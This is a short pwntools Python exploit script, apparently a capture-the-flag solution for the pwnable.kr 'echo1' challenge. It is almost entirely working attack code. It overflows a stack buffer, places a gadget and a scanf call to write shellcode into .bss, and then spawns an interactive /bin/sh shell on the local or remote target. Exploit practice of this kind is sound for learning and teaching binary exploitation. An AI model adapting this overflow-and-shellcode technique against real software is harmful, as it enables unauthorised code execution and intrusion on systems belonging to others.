#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo1")
    libc = elf.libc


else:
    io = remote("pwnable.kr", 9010)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    pppr = asm('pop rdi; pop rsi; ret')
    io.sendlineafter(" : ", pppr)
    #  DEBUG("b *echo1\nc")
    io.sendlineafter("> ", "1")
    payload = flat([cyclic(0x20 + 8), elf.sym['id'], next(elf.search("%s")), elf.bss(), elf.plt['__isoc99_scanf'], elf.bss()])
    io.sendline(payload)

    io.sendline(asm(shellcraft.execve("/bin/sh")))
    
    io.interactive()
    io.close()



